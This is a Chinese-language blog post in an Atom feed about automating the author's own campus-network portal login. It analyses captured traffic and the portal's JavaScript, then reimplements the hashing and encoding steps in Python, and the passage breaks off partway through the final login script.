<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xia0ji233&#39;s blog</title>
  
  <subtitle>学习应该像呼吸一样自然</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-12-08T13:58:59.791Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>xia0ji233</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>校园网模拟登录</title>
    <link href="http://example.com/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/"/>
    <id>http://example.com/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/</id>
    <published>2021-12-08T02:00:00.000Z</published>
    <updated>2021-12-08T13:58:59.791Z</updated>
    
    <content type="html"><![CDATA[<p>学校更新了校园网之后，用的宽带就需要每天早上进行一遍网页登录才能有网，非常的麻烦，我就萌生出了想写个模拟登录的脚本的想法。</p><span id="more"></span><h2 id="抓包获得请求方式"><a href="#抓包获得请求方式" class="headerlink" title="抓包获得请求方式"></a>抓包获得请求方式</h2><p>这里我用wireshark抓包，只抓从登录到登录成功这个时间段的包，这里主要分析我们发送的http的流量包。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/4.png" alt="1"></p><p>可以发现主要有两个流量包出现了username字段，那么主要分析这两个包内容的参数。第一个流量包内容如下</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/5.png" alt="1"></p><p>本次流量包主要有四个参数，<code>callback</code>，<code>username</code>，<code>ip</code>，和<code>_</code>。callback参数不太确定，但是可以确定username是自己登录校园网的账号，ip就是自己本机在这个局域网下的ip，而<code>_</code>很明显就是时间戳。而可以看到call_back后面也有一个类似时间戳的参数。这个暂且不确定，但是后面反复抓包可以发现，这个参数就是固定的。至于本次请求是返回了什么我们可以照着参数打进去看看返回了什么数据，本人很菜，不是打web的，不会用burpsuite只能用这种办法了。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/6.png" alt="1"></p><p>可以发现返回了一串json数据，里面主要有一个challenge字段，感觉是一个类似token的东西，其它的就没什么了，客户端ip，服务端ip，请求状态，产品版本和时间戳。而这里也方便了我们，可以直接从这里获取自己的ip了，但是网页端做这个估计主要还是为了这个token。但是这里并没有密码字段，还没有登录请求。</p><p>剩下的就看看另一个流量包</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/7.png" alt="1"></p><p>第二个流量包的参数很多，首先依旧是callback，跟之前一样，action参数估计是标识本次请求类型为登录，第四个参数开始出现了密码字段，而这个很明显进行了md5加密，os指示操作系统类型，name为大概也是操作系统名称的意思。还有一个double_stack，虽然不懂但是反复抓包发现这个参数也是恒定不变是0，所以也不用去理解它的意思了。chksum参数是一串可能经过某种hash算法得到的值。info同样如此，只是它括起来的这个加密算法着实没听过。然后剩下的参数都是固定的就没必要去纠结了。</p><p>所以想要成功模拟登录，必须得到这些参数，需要计算的就只有password，chksum，info三个参数，那么去分析一下网页源码看看这三个参数是怎么得到的。</p><h2 id="分析网页js"><a href="#分析网页js" class="headerlink" title="分析网页js"></a>分析网页js</h2><p>F12查看，主要寻找登录按钮点击之后干干了什么</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/1.png" alt="1"></p><p>可以看到只对前端进行了基本的校验之后调用了portal的login方法去登录，并且输入的用户名和密码也都传进了portal相应的变量当中，那么就去portal.js文件中分析。</p><p>发现文件很大，选择拷贝一份放ide中分析，寻找login函数，</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/2.png" alt="2"></p><p>可以发现这里主要是进行登录类型判断，进行选择，那就接着追踪。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/3.png" alt="3"></p><p>可以发现是用一个_loginAccount函数去登录的，而这个函数就在下面，我们看看它的逻辑。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/8.png" alt="3"></p><p>这里主要有一个getToken函数,然后密码用password和token进行了md5加盐的hash加密，因此password字段就很容易得出来了，那么我们接着看看token怎么获取的，之前我们通过手动请求猜测challenge字段是可能是token，这次我们跟踪_getToken函数看看。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/9.png" alt="3"></p><p>发现这里返回了res.challenge，那么就可以大胆推定刚刚的challenge就是token了。那么登录的流程应该就是，先去请求一个token，然后用token进行加密登录。这里先给出md5加密的脚本，这里参考了别的师傅的博客的做法，在这里—-&gt;<a href="https://blog.csdn.net/qq_41797946/article/details/89417722">传送门</a>，我也一直没理解它盐是怎么加的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_md5.py</span></span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_md5</span>(<span class="params">password,token</span>):</span></span><br><span class="line"><span class="keyword">return</span> hmac.new(token.encode(), password.encode(), hashlib.md5).hexdigest()</span><br></pre></td></tr></table></figure><p>翻到后面可以直接看到url的请求参数。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/10.png" alt="3"></p><p>url可以直接抓包获得，这个没必要去分析它的url是啥，主要看我们之前需要知道的三个字段，这里第二点不太明白了，虽然看到它的挡路方式好像是OTP，但是抓包获得的一直是{md5}，也不太懂为啥，但是我们姑且选择后者，毕竟实践才是检验真理的唯一标准嘛。</p><p>这里password的hmd5我们前面已经可以算了，接下来这个info的参数是i，chksum的参数是sha1(str)，对str进行了sha1加密。那么我们往上看看这个i和这个str是怎么获得的。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/11.png" alt="3"></p><p>这里可以看到str只是对一些参数进行了相加，最后sha1散列。</p><p>那么如此一来我们只需要得到i就可以把整个url的参数构造完成了。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/12.png" alt="3"></p><p>可以看到是调用了_encodeUserInfo函数去加密得到i的，那么我们进一步搜索这个函数的加密方式。</p><p>这里我直接贴出来这个加密的函数了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">_encodeUserInfo.set(_assertThisInitialized(_this), &#123;</span><br><span class="line">      <span class="attr">writable</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">value</span>: <span class="function"><span class="keyword">function</span> <span class="title">value</span>(<span class="params">info, token</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 克隆自 $.base64，防止污染</span></span><br><span class="line">        <span class="keyword">var</span> base64 = _this.clone($.base64); <span class="comment">// base64 设置 Alpha</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        base64.setAlpha(<span class="string">&#x27;LVoJPiCN2R8G90yg+hmFHuacZ1OWMnrsSTXkYpUq/3dlbfKwv6xztjI7DeBE45QA&#x27;</span>); <span class="comment">// 用户信息转 JSON</span></span><br><span class="line"></span><br><span class="line">        info = <span class="built_in">JSON</span>.stringify(info);</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params">str, key</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (str === <span class="string">&#x27;&#x27;</span>) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">          <span class="keyword">var</span> v = s(str, <span class="literal">true</span>);</span><br><span class="line">          <span class="keyword">var</span> k = s(key, <span class="literal">false</span>);</span><br><span class="line">          <span class="keyword">if</span> (k.length &lt; <span class="number">4</span>) k.length = <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">var</span> n = v.length - <span class="number">1</span>,</span><br><span class="line">              z = v[n],</span><br><span class="line">              y = v[<span class="number">0</span>],</span><br><span class="line">              c = <span class="number">0x86014019</span> | <span class="number">0x183639A0</span>,</span><br><span class="line">              m,</span><br><span class="line">              e,</span><br><span class="line">              p,</span><br><span class="line">              q = <span class="built_in">Math</span>.floor(<span class="number">6</span> + <span class="number">52</span> / (n + <span class="number">1</span>)),</span><br><span class="line">              d = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">while</span> (<span class="number">0</span> &lt; q--) &#123;</span><br><span class="line">            d = d + c &amp; (<span class="number">0x8CE0D9BF</span> | <span class="number">0x731F2640</span>);</span><br><span class="line">            e = d &gt;&gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n; p++) &#123;</span><br><span class="line">              y = v[p + <span class="number">1</span>];</span><br><span class="line">              m = z &gt;&gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>;</span><br><span class="line">              m += y &gt;&gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span> ^ (d ^ y);</span><br><span class="line">              m += k[p &amp; <span class="number">3</span> ^ e] ^ z;</span><br><span class="line">              z = v[p] = v[p] + m &amp; (<span class="number">0xEFB8D130</span> | <span class="number">0x10472ECF</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            m = z &gt;&gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>;</span><br><span class="line">            m += y &gt;&gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span> ^ (d ^ y);</span><br><span class="line">            m += k[p &amp; <span class="number">3</span> ^ e] ^ z;</span><br><span class="line">            z = v[n] = v[n] + m &amp; (<span class="number">0xBB390742</span> | <span class="number">0x44C6F8BD</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> l(v, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">var</span> c = a.length;</span><br><span class="line">          <span class="keyword">var</span> v = [];</span><br><span class="line"></span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; c; i += <span class="number">4</span>) &#123;</span><br><span class="line">            v[i &gt;&gt; <span class="number">2</span>] = a.charCodeAt(i) | a.charCodeAt(i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span> | a.charCodeAt(i + <span class="number">2</span>) &lt;&lt; <span class="number">16</span> | a.charCodeAt(i + <span class="number">3</span>) &lt;&lt; <span class="number">24</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (b) v[v.length] = c;</span><br><span class="line">          <span class="keyword">return</span> v;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">var</span> d = a.length;</span><br><span class="line">          <span class="keyword">var</span> c = d - <span class="number">1</span> &lt;&lt; <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (b) &#123;</span><br><span class="line">            <span class="keyword">var</span> m = a[d - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (m &lt; c - <span class="number">3</span> || m &gt; c) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            c = m;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; d; i++) &#123;</span><br><span class="line">            a[i] = <span class="built_in">String</span>.fromCharCode(a[i] &amp; <span class="number">0xff</span>, a[i] &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span>, a[i] &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>, a[i] &gt;&gt;&gt; <span class="number">24</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> b ? a.join(<span class="string">&#x27;&#x27;</span>).substring(<span class="number">0</span>, c) : a.join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#123;SRBX1&#125;&#x27;</span> + base64.encode(encode(info, token));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>这里也得感谢这位大佬将这个js转成了python脚本，我就直接贴结果了,里面还有一个很明显的base64，这里我也不自己写了，直接贴吧哈哈哈。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_xencode.py</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force</span>(<span class="params">msg</span>):</span></span><br><span class="line">    ret = []</span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> msg:</span><br><span class="line">        ret.append(<span class="built_in">ord</span>(w))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(ret)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ordat</span>(<span class="params">msg, idx</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(msg) &gt; idx:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ord</span>(msg[idx])</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sencode</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    l = <span class="built_in">len</span>(msg)</span><br><span class="line">    pwd = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, l, <span class="number">4</span>):</span><br><span class="line">        pwd.append(</span><br><span class="line">            ordat(msg, i) | ordat(msg, i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span> | ordat(msg, i + <span class="number">2</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">            | ordat(msg, i + <span class="number">3</span>) &lt;&lt; <span class="number">24</span>)</span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        pwd.append(l)</span><br><span class="line">    <span class="keyword">return</span> pwd</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lencode</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    l = <span class="built_in">len</span>(msg)</span><br><span class="line">    ll = (l - <span class="number">1</span>) &lt;&lt; <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        m = msg[l - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> m &lt; ll - <span class="number">3</span> <span class="keyword">or</span> m &gt; ll:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        ll = m</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, l):</span><br><span class="line">        msg[i] = <span class="built_in">chr</span>(msg[i] &amp; <span class="number">0xff</span>) + <span class="built_in">chr</span>(msg[i] &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span>) + <span class="built_in">chr</span>(</span><br><span class="line">            msg[i] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>) + <span class="built_in">chr</span>(msg[i] &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(msg)[<span class="number">0</span>:ll]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(msg)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_xencode</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    <span class="keyword">if</span> msg == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    pwd = sencode(msg, <span class="literal">True</span>)</span><br><span class="line">    pwdk = sencode(key, <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(pwdk) &lt; <span class="number">4</span>:</span><br><span class="line">        pwdk = pwdk + [<span class="number">0</span>] * (<span class="number">4</span> - <span class="built_in">len</span>(pwdk))</span><br><span class="line">    n = <span class="built_in">len</span>(pwd) - <span class="number">1</span></span><br><span class="line">    z = pwd[n]</span><br><span class="line">    y = pwd[<span class="number">0</span>]</span><br><span class="line">    c = <span class="number">0x86014019</span> | <span class="number">0x183639A0</span></span><br><span class="line">    m = <span class="number">0</span></span><br><span class="line">    e = <span class="number">0</span></span><br><span class="line">    p = <span class="number">0</span></span><br><span class="line">    q = math.floor(<span class="number">6</span> + <span class="number">52</span> / (n + <span class="number">1</span>))</span><br><span class="line">    d = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; q:</span><br><span class="line">        d = d + c &amp; (<span class="number">0x8CE0D9BF</span> | <span class="number">0x731F2640</span>)</span><br><span class="line">        e = d &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line">        p = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> p &lt; n:</span><br><span class="line">            y = pwd[p + <span class="number">1</span>]</span><br><span class="line">            m = z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span></span><br><span class="line">            m = m + ((y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (d ^ y))</span><br><span class="line">            m = m + (pwdk[(p &amp; <span class="number">3</span>) ^ e] ^ z)</span><br><span class="line">            pwd[p] = pwd[p] + m &amp; (<span class="number">0xEFB8D130</span> | <span class="number">0x10472ECF</span>)</span><br><span class="line">            z = pwd[p]</span><br><span class="line">            p = p + <span class="number">1</span></span><br><span class="line">        y = pwd[<span class="number">0</span>]</span><br><span class="line">        m = z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span></span><br><span class="line">        m = m + ((y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (d ^ y))</span><br><span class="line">        m = m + (pwdk[(p &amp; <span class="number">3</span>) ^ e] ^ z)</span><br><span class="line">        pwd[n] = pwd[n] + m &amp; (<span class="number">0xBB390742</span> | <span class="number">0x44C6F8BD</span>)</span><br><span class="line">        z = pwd[n]</span><br><span class="line">        q = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> lencode(pwd, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_base64.py</span></span><br><span class="line">_PADCHAR = <span class="string">&quot;=&quot;</span></span><br><span class="line">_ALPHA = <span class="string">&quot;LVoJPiCN2R8G90yg+hmFHuacZ1OWMnrsSTXkYpUq/3dlbfKwv6xztjI7DeBE45QA&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_getbyte</span>(<span class="params">s, i</span>):</span></span><br><span class="line">    <span class="comment">#print(s,&#x27; &#x27;,i)</span></span><br><span class="line">    x = <span class="built_in">ord</span>(s[i]);</span><br><span class="line">    <span class="keyword">if</span> (x &gt; <span class="number">255</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;INVALID_CHARACTER_ERR: DOM Exception 5&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64</span>(<span class="params">s</span>):</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    b10=<span class="number">0</span></span><br><span class="line">    x = []</span><br><span class="line">    imax = <span class="built_in">len</span>(s) - <span class="built_in">len</span>(s) % <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,imax,<span class="number">3</span>):</span><br><span class="line">        b10 = (_getbyte(s, i) &lt;&lt; <span class="number">16</span>) | (_getbyte(s, i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span>) | _getbyte(s, i + <span class="number">2</span>);</span><br><span class="line">        x.append(_ALPHA[(b10 &gt;&gt; <span class="number">18</span>)]);</span><br><span class="line">        x.append(_ALPHA[((b10 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">63</span>)]);</span><br><span class="line">        x.append(_ALPHA[((b10 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>)]);</span><br><span class="line">        x.append(_ALPHA[(b10 &amp; <span class="number">63</span>)])</span><br><span class="line">    i=imax</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) - imax ==<span class="number">1</span>:</span><br><span class="line">        b10 = _getbyte(s, i) &lt;&lt; <span class="number">16</span>;</span><br><span class="line">        x.append(_ALPHA[(b10 &gt;&gt; <span class="number">18</span>)] + _ALPHA[((b10 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">63</span>)] + _PADCHAR + _PADCHAR);</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(s) - imax == <span class="number">2</span>:</span><br><span class="line">        b10 = (_getbyte(s, i) &lt;&lt; <span class="number">16</span>) | (_getbyte(s, i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">        x.append(_ALPHA[(b10 &gt;&gt; <span class="number">18</span>)] + _ALPHA[((b10 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">63</span>)] + _ALPHA[((b10 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>)] + _PADCHAR);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(x)</span><br></pre></td></tr></table></figure><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_sha1.py</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sha1</span>(<span class="params">value</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(value.encode()).hexdigest()</span><br></pre></td></tr></table></figure><p>逻辑这么分析到位了之后接下来就开始写两次抓包的脚本吧，这里也直接给了，毕竟逻辑就真的这么点，主要的工作量都在js转python上面，而已经有人转好了我就直接拿过来用了，这里再次鸣谢huxiaofan1223大佬，本篇博客也贴在上面的传送门当中了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span 